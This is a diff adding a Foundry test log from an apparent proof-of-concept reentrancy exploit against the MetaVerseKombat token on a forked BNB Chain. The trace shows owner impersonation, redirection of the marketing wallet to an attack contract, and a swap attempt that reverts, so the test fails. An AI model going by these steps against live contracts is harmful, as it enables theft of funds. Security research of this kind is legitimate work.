@@ -1,0 +1,83 @@
+No files changed, compilation skipped
+2026-06-16T12:18:51.194270Z  WARN foundry_fork_db::cache: Failed to read cache file err=Os { code: 2, kind: NotFound, message: "No such file or directory" } path="/Users/carl/.foundry/cache/rpc/bsc/104564983"
+
+Ran 1 test for test/Exploit.t.sol:ExploitTest
+[FAIL: TransferHelper: TRANSFER_FROM_FAILED] testReentrancyExploit() (gas: 673140)
+2026-06-16T12:19:06.877769Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T12:19:06.879101Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T12:19:06.881601Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T12:19:06.881709Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T12:19:06.881790Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T12:19:06.881872Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T12:19:07.712514Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T12:19:07.712563Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T12:19:07.712594Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T12:19:07.712623Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T12:19:07.713025Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x5615deb798bb3e4dfa0139dfa1b3d433cc23b72f)
+Traces:
+  [85430] ExploitTest::setUp()
+    ├─ [0] VM::addr(<pk>) [staticcall]
+    │   └─ ← [Return] attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]
+    ├─ [0] VM::label(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], "attacker")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(MetaVerseKombat: [0x3405ff989F8bb8Efd6C85Ad6B29219D3383A5FB0], "MetaVerseKombat")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], "attacker")
+    │   └─ ← [Return]
+    ├─ [2423] MetaVerseKombat::owner() [staticcall]
+    │   └─ ← [Return] owner: [0xd3Fc51D5F3943F0a5fb2543B3a5773fd26B98206]
+    ├─ [2481] MetaVerseKombat::pancakePair() [staticcall]
+    │   └─ ← [Return] pancakePair: [0x451C4Ee838B7FcB260F04E55E0e2d78c6EeE702A]
+    ├─ [0] VM::label(owner: [0xd3Fc51D5F3943F0a5fb2543B3a5773fd26B98206], "owner")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(pancakePair: [0x451C4Ee838B7FcB260F04E55E0e2d78c6EeE702A], "pancakePair")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [673140] ExploitTest::testReentrancyExploit()
+    ├─ [240318] → new attackContract@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   └─ ← [Return] 977 bytes of code
+    ├─ [0] VM::label(attackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], "attackContract")
+    │   └─ ← [Return]
+    ├─ [0] VM::startPrank(owner: [0xd3Fc51D5F3943F0a5fb2543B3a5773fd26B98206])
+    │   └─ ← [Return]
+    ├─ [8393] MetaVerseKombat::update_MarketingWalletAddress(attackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   ├─ emit UpdateMarketingWalletAddress()
+    │   └─ ← [Stop]
+    ├─ [26080] MetaVerseKombat::setSwapAndLiquifyEnabled(true, 0)
+    │   ├─ emit SwapAndLiquifyEnabledUpdated(enabled: true)
+    │   └─ ← [Stop]
+    ├─ [145227] MetaVerseKombat::transfer(attackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 100000000000000000000 [1e20])
+    │   ├─ emit Transfer(from: owner: [0xd3Fc51D5F3943F0a5fb2543B3a5773fd26B98206], to: attackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 100000000000000000000 [1e20])
+    │   └─ ← [Return] true
+    ├─ [103727] MetaVerseKombat::transfer(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], 1000000000000000000000 [1e21])
+    │   ├─ emit Transfer(from: owner: [0xd3Fc51D5F3943F0a5fb2543B3a5773fd26B98206], to: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], value: 1000000000000000000000 [1e21])
+    │   └─ ← [Return] true
+    ├─ [0] VM::stopPrank()
+    │   └─ ← [Return]
+    ├─ [482] MetaVerseKombat::marketingwallet() [staticcall]
+    │   └─ ← [Return] attackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]
+    ├─ [565] MetaVerseKombat::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
+    │   └─ ← [Return] 1000000000000000000000 [1e21]
+    ├─ [0] VM::prank(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
+    │   └─ ← [Return]
+    ├─ [90465] MetaVerseKombat::transfer(pancakePair: [0x451C4Ee838B7FcB260F04E55E0e2d78c6EeE702A], 1000000000000000000000 [1e21])
+    │   ├─ [275] PancakeRouter::WETH() [staticcall]
+    │   │   └─ ← [Return] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c
+    │   ├─ emit Approval(owner: MetaVerseKombat: [0x3405ff989F8bb8Efd6C85Ad6B29219D3383A5FB0], spender: PancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 16515401642663323887234 [1.651e22])
+    │   ├─ [5531] PancakeRouter::swapExactTokensForETHSupportingFeeOnTransferTokens(16515401642663323887234 [1.651e22], 0, [0x3405ff989F8bb8Efd6C85Ad6B29219D3383A5FB0, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], MetaVerseKombat: [0x3405ff989F8bb8Efd6C85Ad6B29219D3383A5FB0], 1781612327 [1.781e9])
+    │   │   ├─ [3059] MetaVerseKombat::transferFrom(MetaVerseKombat: [0x3405ff989F8bb8Efd6C85Ad6B29219D3383A5FB0], pancakePair: [0x451C4Ee838B7FcB260F04E55E0e2d78c6EeE702A], 16515401642663323887234 [1.651e22])
+    │   │   │   └─ ← [Revert] BEP20: Sender Is Blocked
+    │   │   └─ ← [Revert] TransferHelper: TRANSFER_FROM_FAILED
+    │   └─ ← [Revert] TransferHelper: TRANSFER_FROM_FAILED
+    └─ ← [Revert] TransferHelper: TRANSFER_FROM_FAILED
+
+Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 15.68s (12.37s CPU time)
+
+Ran 1 test suite in 17.94s (15.68s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)
+
+Failing tests:
+Encountered 1 failing test in test/Exploit.t.sol:ExploitTest
+[FAIL: TransferHelper: TRANSFER_FROM_FAILED] testReentrancyExploit() (gas: 673140)
+
+Encountered a total of 1 failing tests, 0 tests succeeded
